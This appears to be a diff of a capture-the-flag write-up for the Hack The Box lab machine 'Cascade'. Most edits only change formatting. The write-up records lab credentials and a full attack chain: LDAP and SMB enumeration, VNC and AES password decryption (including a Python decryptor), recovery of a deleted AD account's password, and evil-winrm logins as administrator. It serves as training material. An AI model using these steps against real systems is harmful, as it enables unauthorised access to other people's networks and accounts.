@@ -1,4 +1,4 @@
-Q# Reconnaissance
+# Reconnaissance
 - 
 ## Nmap Enumeration
 - We pass the commands:
@@ -56,11 +56,11 @@ PORT     STATE         SERVICE      REASON
 - Initial enumeration gives nothing with null, guest and anonymous
 ## LDAPsearch
 - checked anonymous authentication with ldap:
-	```bash
-ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts
+```bash
+ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts 
 ```
 - Checking for bad passwords:
-	```bash
+```bash
 ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" | grep -i "pwd"
 ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" | grep -i "pwd" -A10 -B10
 
@@ -91,18 +91,18 @@ dn: CN={D67C2AD5-44C7-4468-BA4C-199E75B2F295},CN=Policies,CN=System,DC=cascade
 # Util, Services, Users, UK, cascade.local
 
 ```
-	- We get credentials of r.thompson user  `clk0bjVldmE=`
-		- We try check with crackmap exec but it fails
-			- Maybe it is encoded
+- We get credentials of r.thompson user  `clk0bjVldmE=`
+- We try check with crackmap exec but it fails
+- Maybe it is encoded
 - It looks like base64 so we try to decode it :
-	```bash
+```bash
 echo clk0bjVldmE= | base64 -d
 
 ---OUTPUT---
 rY4n5eva
 ```
 - We check smb with these credentials and find some shares we can access:
-	```bash
+```bash
 crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares
 
 ---OUTPUT---
@@ -122,7 +122,7 @@ SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ        
 ```
 - We access print$ share and find nothing relevant
 - We access Data share and we can access one folder in it which holds some files:
-	```bash
+```bash
 smbclient -U 'r.thompson' //10.10.10.182/Data --password='rY4n5eva'
 smb: \> cd IT\
 smb: \> dir
@@ -137,8 +137,8 @@ smb: \> dir
 
                 6553343 blocks of size 4096. 1625203 blocks available
 ```
-	- I explore the folder and get some files I feel would be relevant:
-		```bash
+- I explore the folder and get some files I feel would be relevant:
+```bash
 smb: \IT\> cd Logs\DC$\
 smb: \IT\Logs\DC$\> get dcdiag.log
 smb: \IT\Logs\DC$> cd ..
@@ -153,26 +153,26 @@ smb: \IT\> cd Temp\
 smb: \IT\Temp\> cd s.smith\
 smb: \IT\Temp\s.smith\> get "VNC Install.reg"
 ```
-		- On reading the files
-			- Meeting Notes we see a user TempAdmin exists with the same password as administrator
-			- On reading VNC Install.reg file we find some sort of hex password:
-				```bash
+- On reading the files
+- Meeting Notes we see a user TempAdmin exists with the same password as administrator
+- On reading VNC Install.reg file we find some sort of hex password:
+```bash
 cat VNC\ Install.reg
 
 ---RELEVANT-OUTPUT---
 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
 ```
 - We try to decrypt this like last time (but for hex) but don't get a readable output:
-	```bash
+```bash
 echo 6bcf2a4b6e5aca0f | xxd -r -p
 
 ---OUTPUT---
 k�*KnZ�
 ```
 - On searching online for "vnc registry file password decrypt" I came across a link:
-	- https://github.com/frizb/PasswordDecrypts
-		- There is a way via meterpreter :
-			```bash
+- https://github.com/frizb/PasswordDecrypts
+- There is a way via meterpreter :
+```bash
 msf6 > irb
 [*] Starting IRB shell...
 [*] You are in the "framework" object
@@ -186,8 +186,8 @@ irb: warn: can't alias jobs from irb_jobs.
 => "sT333ve2"
 >> 
 ```
-		- has more references to vnc password crack but also provides the command which I use with my data:
-			```bash
+- has more references to vnc password crack but also provides the command which I use with my data:
+```bash
 echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
 
 ---OUTPUT---
@@ -195,7 +195,7 @@ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K 
 00000008
 ```
 - We check these credentials with smb and winrm:
-	```bash
+```bash
 crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2'
 crackmapexec winrm 10.10.10.182 -u 's.smith' -p 'sT333ve2'
 
@@ -211,9 +211,9 @@ HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985
 WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
 
 ```
-	- We get a hit for both
+- We get a hit for both
 - We login via winrm 
-	```bash
+```bash
 evil-winrm -u 's.smith' -p 'sT333ve2' -i 10.10.10.182
 
 ---OUTPUT---
@@ -231,8 +231,8 @@ cascade\s.smith
 ----------
 ## Lateral Movement in Target
 - We do some initial enumeration:
-	- whoami /all
-		```bash
+- whoami /all
+```bash
 whoami /all # whoami /priv for privileges only
 
 ---OUTPUT-WHOAMI-ALL---
@@ -272,8 +272,8 @@ SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
-	- net users :
-		```bash
+- net users :
+```bash
 net users
 net user s.smith
 net user r.thompson
@@ -319,9 +319,9 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 
 ```
-	- We see s.smith is in a group Audit Share. There was an SMB share which thompson couldn't access a share called Audit. Also if we check thompson's group memberships, he is not part of this Audit Share group.
+- We see s.smith is in a group Audit Share. There was an SMB share which thompson couldn't access a share called Audit. Also if we check thompson's group memberships, he is not part of this Audit Share group.
 - We check if s.smith can access Audit share folder
-	```bash
+```bash
 crackmapexec smb 10.10.10.182 -u 's.smith' -p 'sT333ve2' --shares     
 SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
 SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
@@ -337,9 +337,9 @@ SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ        
 SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
 SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
 ```
-	- He has read privileges
+- He has read privileges
 - We access the share and grab all files:
-	```bash
+```bash
 smbclient -U 's.smith' //10.10.10.182/Audit$ --password='sT333ve2'
 smb: \> prompt OFF
 smb: \> recurse ON
@@ -361,7 +361,7 @@ smb: \> mget *
 
 ```
 - We read Audit.db with sqlite3 command:
-	```bash
+```bash
 sqlite3 Audit.db .dump
 
 ---RELEVANT-OUTPUT---
@@ -393,9 +393,9 @@ INSERT INTO sqlite_sequence VALUES('Ldap',2);
 INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
 COMMIT;
 ```
-	- We see some ArkSvc credentials : `ArkSvc`:`BQO5l5Kj9MdErXx6Q6AGOw==`
-		- We use it but fails. We try to decrypt base64 on it but it doesn't give anything readable
-			```bash
+- We see some ArkSvc credentials : `ArkSvc`:`BQO5l5Kj9MdErXx6Q6AGOw==`
+- We use it but fails. We try to decrypt base64 on it but it doesn't give anything readable
+```bash
 echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d
 
 ## Failed/ No hits
@@ -407,13 +407,13 @@ crackmapexec winrm 10.10.10.182 -u 'ArkSvc' -p 'BQO5l5Kj9MdErXx6Q6AGOw=='
 ������D�|zC�;
 ```
 - I then decide to analyze the CascAudit.exe file with dnSpy ( I move all thse files to my Windows host for this)
-	- I check the main module and I see a command :
-		```bash
+- I check the main module and I see a command :
+```bash
 password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
 ```
-		- If we check Crypto.DecryptString function it will ex plain how it decrypts (basically takes a key and encrypted string as arguments to decrypt)
-			- Uses AES encryption with a key. Using this and the base64 encoded password, we can write a code to decrypt it:
-				```python
+- If we check Crypto.DecryptString function it will eplain how it decrypts (basically takes a key and encrypted string as arguments to decrypt)
+- Uses AES encryption with a key. Using this and the base64 encoded password, we can write a code to decrypt it:
+```python
 from base64 import b64decode
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
@@ -444,8 +444,8 @@ try:
 except Exception as e:
     print("Error:", e)
 ```
-				- Execute the file:
-					```bash
+- Execute the file:
+```bash
 python3 -m venv venv
 source venv/bin/activate
 pip install pycryptodome
@@ -454,18 +454,19 @@ python pythoncrack.py
 ---OUTPUT---
 Decrypted text: w3lc0meFr31nd
 ```
-- We can add a break here and run the code and hopefully grab the password from it:
-	- We press F9 to add a break point at that command and run the file. Continue till it reaches our break point. We can then step over (with F10) and we should be able to see the password in plain text:
- ![[Pasted image 20250423121049.png]]
+- **Alternate Method (Easier)**
+- Going back to analysing the executable with dnSpy, we can add a break at the line of code decrypting the password (shown above) and run the code and hopefully grab the password from it:
+- We press F9 to add a break point at that command and run the file. Continue till it reaches our break point. We can then step over (with F10) and we should be able to see the password in plain text:
+- ![[Pasted image 20250423121049.png]]
 ```bash
 w3lc0meFr31nd\0\0\0
 ```
 - We login to this user's account.
-	```bash
+```bash
 
 ```
 - On enumeration we find user is in AD Recycle Bin group:
-	```bash
+```bash
 net user arksvc
 
 ---OUTPUT---
@@ -497,9 +498,9 @@ Global Group memberships     *Domain Users
 The command completed successfully.
 ```
 - Looking through google I came across this link:
-	- https://github.com/MicrosoftDocs/windowsserverdocs/blob/main/WindowsServerDocs/identity/ad-ds/get-started/adac/active-directory-recycle-bin.md
-	- I tried to restore a user (although I shouldn't have as that wouldn't do much) but got a permission error:
-		```bash
+- https://github.com/MicrosoftDocs/windowsserverdocs/blob/main/WindowsServerDocs/identity/ad-ds/get-started/adac/active-directory-recycle-bin.md
+- I tried to restore a user (although I shouldn't have as that wouldn't do much) but got a permission error:
+```bash
 Get-ADObject -Filter 'Name -Like "*User*"' -IncludeDeletedObjects
 Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeletedObjects
 Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeletedObjects | Restore-ADObject
@@ -512,8 +513,8 @@ At line:1 char:74
     + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
     + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
 ```
-	- Then I tried to enable AD Recycle Bin but the machine hung (again, unnecessary)
-		```bash
+- Then I tried to enable AD Recycle Bin but the machine hung (again, unnecessary)
+```bash
 Enable-ADOptionalFeature -Identity 'CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=cascade,DC=local' -Scope ForestOrConfigurationSet -Target 'cascade.local'
 
 ---OUTPUT---
@@ -525,8 +526,8 @@ Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinR
                                         
 Error: Exiting with code 1
 ```
-	- Then looking back at my second command, I tried to simply get more information on the TempAdmin user 
-		```bash
+- Then looking back at my second command, I tried to simply get more information on the TempAdmin user 
+```bash
 Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeleted -Properties *
 --OR--
 Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeleted -Properties * | findstr /i  pwd
@@ -534,13 +535,13 @@ Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeleted -Properties * | 
 ---RELEVANT-OUTPUT---
 cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
 ```
-		- Alternatvely on searching google for "query deleted objects get addomain" I found this link
-			- https://forums.powershell.org/t/find-all-deleted-ad-objects-in-the-past-30-days/3731
-				```bash
+- Alternatvely on searching google for "query deleted objects get addomain" I found this link
+- https://forums.powershell.org/t/find-all-deleted-ad-objects-in-the-past-30-days/3731
+```bash
 Get-ADObject -SearchBase 'CN=Deleted Objects, DC=cascade, DC=local' -Filter {ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties * | ft CN,LastKnownParent,whenChanged -AutoSize
 ```
-			- Simply remove the filter and we get all properties where we can find the Password (alternatively we can search for str and if we search for pwd without it being case sensitive we will find it):
-				```bash
+- Simply remove the filter and we get all properties where we can find the Password (alternatively we can search for str and if we search for pwd without it being case sensitive we will find it):
+```bash
 Get-ADObject -SearchBase 'CN=Deleted Objects, DC=cascade, DC=local' -Filter {ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties *
 --OR--
 Get-ADObject -SearchBase 'CN=Deleted Objects, DC=cascade, DC=local' -Filter {ObjectClass -eq 'user'} -IncludeDeletedObjects -Properties * | findstr /i pwd
@@ -556,7 +557,7 @@ CN                              : TempAdmin
 ```
 
 - We attempt to check id credentials work with admin:
-	```bash
+```bash
 crackmapexec winrm 10.10.10.182 -u 'administrator' -p 'YmFDVDNyMWFOMDBkbGVz'
 # Also tried (not hit)
 # crackmapexec smb 10.10.10.182 -u 'administrator' -p 'YmFDVDNyMWFOMDBkbGVz'
@@ -568,17 +569,17 @@ HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\administrator:YmFDVDNyMWFOMDBkbGVz
 ```
-	- It fails..maybe it is encrypted again
+- It fails..maybe it is encrypted again
 - We try to decrypt with base64:
-	```bash
+```bash
 echo YmFDVDNyMWFOMDBkbGVz | base64 -d
 
 ---OUTPUT---
 baCT3r1aN00dles
 ```
-	- we get some readable credentials
+- we get some readable credentials
 - We try it with these credentials.
-	```bash
+```bash
 crackmapexec winrm 10.10.10.182 -u 'administrator' -p 'baCT3r1aN00dles'
 
 ---OUTPUT---
@@ -588,9 +589,9 @@ HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
 ```
-	- We get a hit!
+- We get a hit!
 - We login to target as administrator:
-	```bash
+```bash
 evil-winrm -u 'administrator' -p 'baCT3r1aN00dles' -i 10.10.10.182
 
 ---OUTPUT---
@@ -604,15 +605,12 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 
 ```
-	- We grab the root flag
+- We grab the root flag
 -----------
-## Privilege Escalation in Target
-- 
--------
 --------
 ## Extras
 - Meterpreter route to grab password for s.smith
-	```bash
+```bash
 msf6 > irb
 [*] Starting IRB shell...
 [*] You are in the "framework" object
@@ -628,15 +626,15 @@ irb: warn: can't alias jobs from irb_jobs.
 ```
 -----
 - Initially didn't find pwd in ldap (had to use grep -i and search for pwd instead of password)
-	- Finding all users, fixing it to save to a file:
-		```bash
+- Finding all users, fixing it to save to a file:
+```bash
 ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" '(ObjectClass=user)' sAMAccountName | grep "sAMAccountName" > ldapusers
 cat ldapusers | awk -F: '{print $2}' | awk '{print$1}' > fixedldapusers
 ```
-		- We can also use `'(ObjectClass=Person)'` 
-		- For the second command I use awk twice to remove the space
-	- Checking password policy incase we brute force:
-		```bash
+- We can also use `'(ObjectClass=Person)'` 
+- For the second command I use awk twice to remove the space
+- Checking password policy incase we brute force:
+```bash
 crackmapexec smb 10.10.10.182 --pass-pol   
 
 ---OUTPUT---
@@ -660,8 +658,8 @@ SMB         10.10.10.182    445    CASC-DC1         Locked Account Duration: 30 
 SMB         10.10.10.182    445    CASC-DC1         Account Lockout Threshold: None
 SMB         10.10.10.182    445    CASC-DC1         Forced Log off Time: Not Set
 ```
-		- No lockout threshold
-	- Tried to check is any user has their own username as password in smb (as well as no password) but that didn't give a hit.
+- No lockout threshold
+- Tried to check is any user has their own username as password in smb (as well as no password) but that didn't give a hit.
 ----
 - 
 
@@ -675,7 +673,7 @@ SMB         10.10.10.182    445    CASC-DC1         Forced Log off Time: Not Set
 ```
 
 - winpeas data:
-	```bash
+```bash
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
     Some AutoLogon credentials were found
     DefaultDomainName             :  CASCADE
